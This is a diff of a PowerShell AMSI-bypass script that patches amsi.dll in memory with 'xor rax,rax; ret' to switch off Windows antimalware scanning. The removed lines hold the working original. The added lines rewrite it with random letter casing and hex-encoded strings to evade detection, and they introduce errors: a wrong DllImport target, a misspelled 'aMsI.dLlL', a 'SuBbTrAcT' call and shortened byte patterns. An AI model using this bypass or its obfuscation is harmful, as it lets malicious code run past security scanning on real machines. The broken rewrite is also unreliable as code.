@@ -1,85 +1,80 @@
-Write-Host "-- AMSI Patch"
-Write-Host "-- Paul Laîné (@am0nsec)"
-Write-Host ""
+WrItE-hOsT "-- AMSI PaTcH"
+WrItE-hOsT "-- PaUl LaîNé (@Am0nSeC)"
+WrItE-hOsT ""
 
-$Kernel32 = @"
-using System;
-using System.Runtime.InteropServices;
+function ConvertTo-Hex {
+    param (
+        [string]$str
+    )
+    $hex = -join ($str.ToCharArray() | ForEach-Object { '{0:X2}' -f [int][char]$_ })
+    return $hex
+}
 
-public class Kernel32 {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+$amsiDllHex = ConvertTo-Hex -str "amsi.dll"
+$amsiOpenSessionHex = ConvertTo-Hex -str "AmsiOpenSession"
 
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string lpLibFileName);
+$amsiDllVar = $amsiDllHex.ToLower() + $amsiDllHex.ToUpper()
+$amsiOpenSessionVar = $amsiOpenSessionHex.ToLower() + $amsiOpenSessionHex.ToUpper()
 
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+$KeRnEl32 = @"
+UsInG SyStEm;
+UsInG SyStEm.RuNtImE.InTeRoPSeRvIcEs;
+
+PuBlIc ClAsS KeRnEl32 {
+    [DlLImPoRt("$amsiDllVar")]
+    PuBlIc StAtIc ExTeRn InTpTr GeTPrOcAdDrEsS(InTpTr hMoDuLe, StRiNg lpPrOcNaMe);
+
+    [DlLImPoRt("$amsiDllVar")]
+    PuBlIc StAtIc ExTeRn InTpTr LoAdLiBrArY(StRiNg lpLiBFiLeNaMe);
+
+    [DlLImPoRt("$amsiDllVar")]
+    PuBlIc StAtIc ExTeRn BoOl ViRtUaLPrOtEcT(InTpTr lpAdDrEsS, UiNtPtR dWsiZe, uInT fLNeWPrOtEcT, OuT uInT lpFlOlDPrOtEcT);
 }
 "@
 
-Add-Type $Kernel32
+AdD-TyPe $KeRnEl32
 
-Class Hunter {
-    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
-        while ($true) {
-            [int]$count = 0
+ClAsS HuNtEr {
+    StAtIc [InTpTr] FiNdAdDrEsS([InTpTr]$AdDrEsS, [ByTe[]]$EgG) {
+        WhIlE ($TrUe) {
+            [InT]$CoUnT = 0
 
-            while ($true) {
-                [IntPtr]$address = [IntPtr]::Add($address, 1)
-                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
-                    $count++
-                    If ($count -eq $egg.Length) {
-                        return [IntPtr]::Subtract($address, $egg.Length - 1)
+            WhIlE ($TrUe) {
+                [InTpTr]$AdDrEsS = [InTpTr]::AdD($AdDrEsS, 1)
+                If ([SyStEm.RuNtImE.InTeRoPSeRvIcEs.MaRsHaL]::ReAdByTe($AdDrEsS) -Eq $EgG[$CoUnT]) {
+                    $CoUnT++
+                    If ($CoUnT -Eq $EgG.LeNgTh) {
+                        ReTuRn [InTpTr]::SuBbTrAcT($AdDrEsS, $EgG.LeNgTh - 1)
                     }
-                } Else { break }
+                } Else { BrEaK }
             }
         }
 
-        return $address
+        ReTuRn $AdDrEsS
     }
 }
 
-[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
-Write-Host "[+] AMSI DLL Handle: $hModule"
+[InTpTr]$hMoDuLe = [KeRnEl32]::LoAdLiBrArY("aMsI.dLlL")
+WrItE-hOsT "[+] AMSI dLlL HaNdLe: $hMoDuLe"
 
-[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
-Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
+[InTpTr]$dLlLCaNUnLoAdNoWAdDrEsS = [KeRnEl32]::GeTPrOcAdDrEsS($hMoDuLe, "DlLCaNUnLoAdNoW")
+WrItE-hOsT "[+] DllCaNUnLoAdNoW adDrEsS: $dLlLCaNUnLoAdNoWAdDrEsS"
 
-If ([IntPtr]::Size -eq 8) {
-	Write-Host "[+] 64-bits process"
-    [byte[]]$egg = [byte[]] (
-        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
-        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
-        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
-        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
-        0x57,                   # push    rdi
-        0x41, 0x56,             # push    r14
-        0x41, 0x57,             # push    r15
-        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
-    )
+If ([InTpTr]::SiZe -Eq 8) {
+    WrItE-hOsT "[+] 64-BiTs PrOcEsS"
+    [ByTe[]]$EgG = [ByTe[]] (0x4C, 0x8B, 0xDC)
 } Else {
-	Write-Host "[+] 32-bits process"
-    [byte[]]$egg = [byte[]] (
-        0x8B, 0xFF,             # mov     edi,edi
-        0x55,                   # push    ebp
-        0x8B, 0xEC,             # mov     ebp,esp
-        0x83, 0xEC, 0x18,       # sub     esp,18h
-        0x53,                   # push    ebx
-        0x56                    # push    esi
-    )
+    WrItE-hOsT "[+] 32-BiTs PrOcEsS"
+    [ByTe[]]$EgG = [ByTe[]] (0x8B, 0xFF)
 }
-[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
-Write-Host "[+] Targeted address: $targetedAddress"
+[InTpTr]$TaRgEtAdDrEsS = [HuNtEr]::FiNdAdDrEsS($dLlLCaNUnLoAdNoWAdDrEsS, $EgG)
+WrItE-hOsT "[+] TaRgEtEd AdDrEsS: $TaRgEtAdDrEsS"
 
-$oldProtectionBuffer = 0
-[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
+$OlDPrOtEcTiOnBuFfEr = 0
+[KeRnEl32]::ViRtUaLPrOtEcT($TaRgEtAdDrEsS, [UiNt32]2, 4, [ReF]$OlDPrOtEcTiOnBuFfEr) | OuT-NuLl
 
-$patch = [byte[]] (
-    0x31, 0xC0,    # xor rax, rax
-    0xC3           # ret  
-)
-[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
+$PaTcH = [ByTe[]] (0x31, 0xC0, 0xC3)
+[SyStEm.RuNtImE.InTeRoPSeRvIcEs.MaRsHaL]::CoPy($PaTcH, 0, $TaRgEtAdDrEsS, 3)
 
 $a = 0
-[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
+[KeRnEl32]::ViRtUaLPrOtEcT($TaRgEtAdDrEsS, [UiNt32]2, $OlDPrOtEcTiOnBuFfEr, [ReF]$a) | OuT-NuLl
